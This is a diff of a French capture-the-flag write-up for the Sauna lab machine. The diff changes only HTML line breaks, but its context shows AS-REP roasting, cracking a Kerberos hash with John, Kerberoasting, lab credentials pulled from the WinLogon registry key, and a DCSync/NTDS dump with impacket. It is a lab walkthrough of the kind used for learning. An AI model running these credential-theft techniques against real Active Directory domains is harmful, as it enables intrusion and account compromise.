@@ -244,7 +244,7 @@ PORT     STATE SERVICE       VERSION
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
 search egotistical-bank.local
 nameserver 10.10.10.175
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h2 id="potentiels-utilisateurs-et-asreproasting">Potentiels utilisateurs et ASRepRoasting</h2>
 <p>N&rsquo;ayant pas trouvé d&rsquo;autre point d&rsquo;entrée, on se tourne rapidement vers le site web de l&rsquo;entreprise. Quelques recherche sur la possible exploitation du serveur IIS ne donnent rien.
 Cependant, un élément intéressant attire notre attention. En effet, la page <code>about</code> de l&rsquo;entreprie mentionne plusieurs collaborateurs ainsi que la note suivante.</p>
@@ -286,7 +286,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f51424f1adb173550e06e8404dec4fe$98c
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
 </code></pre></div><p>Bingo ! le compte <code>fsmith</code> semble valide. Le ticket n&rsquo;est cependant pas utilisable en l&rsquo;état. En effet, il est nécessaire de casser ce dernier afin de retrouver le mot de passe en clair.
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="passacracking-et-shell-user">Passacracking et shell user</h2>
 <p>Lancement d&rsquo;une petite session de passcracking, on sort <code>John</code> et on tente de casser le ticket avec une wordlist simple connue.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo john KRB5ASREP_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>krb5asrep
@@ -347,7 +347,7 @@ PS &gt; ls ../Desktop
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----              1/23/2020 10:03 AM    <span style="color:#ae81ff">34</span>     user.txt
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h2 id="énumération-12-et-kerberoasting">Énumération (1/2) et Kerberoasting</h2>
 <p>Ayant un accès à la machine et au domaine, la phase d&rsquo;énumération peut commencer.
 En repensant à la note vue auparavant, on se doute qu&rsquo;un compte utilisateur doit avoir certains droits (le compte &ldquo;security manager&rdquo;).</p>
@@ -388,7 +388,7 @@ CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</spa
 CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> EGOTISTICALBANK<span style="color:#ae81ff">\h</span>smith:Thestrokes23 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
 </code></pre></div><p>Cependant, on se rend également rapidement compte que cet utilisateur ne dispose pas de droits particulièrement intéressants pour nous&hellip;
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="énumération-22-et-obtention-dun-nouveau-compte">Énumération (2/2) et obtention d&rsquo;un nouveau compte</h2>
 <p>Dans la mesure où le second compte récupéré n&rsquo;aide pas à la compromission de la machine, on repart dans une seconde phase d&rsquo;énumération, cette fois ci orientée sur la machine et ses fichiers.</p>
 <p>Après quelques recherches classiques, des informations intéressantes peuvent être récupérées au niveau de la clé de registre <code>WinLogon</code>, et plus particulièrement le 3e compte utilisateur du domaine.</p>
@@ -438,7 +438,7 @@ CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</spa
 CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> EGOTISTICALBANK<span style="color:#ae81ff">\s</span>vc_loanmgr:Moneymakestheworldgoround! 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
 </code></pre></div><p>Ok ! On dispose maintenant de tous les comptes utilisateurs du domaine, à l&rsquo;exception des comptes built-in et/ou privilégiés.
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="dump-de-la-base-ntds-et-compromission">Dump de la base NTDS et compromission</h2>
 <p>Je passe la phase de recherche afin d&rsquo;arriver directement à la solution. La phase de reconnaissance peut être réalisée à l&rsquo;aide d&rsquo;outils tels que <code>BloodHound</code>, cela permet notamment d&rsquo;observer que le compte <code>svc_loanmgr</code> possède les droits DCSync !. Cela implique que le compte <code>svc_loanmgr</code> dispose des droits suffisants pour accéder à la base NTDS de l&rsquo;Active Directory.</p>
 <p>Ainsi, on peut par exemple extraire cette dernière à distance à l&rsquo;aide de <code>impacket</code>.</p>
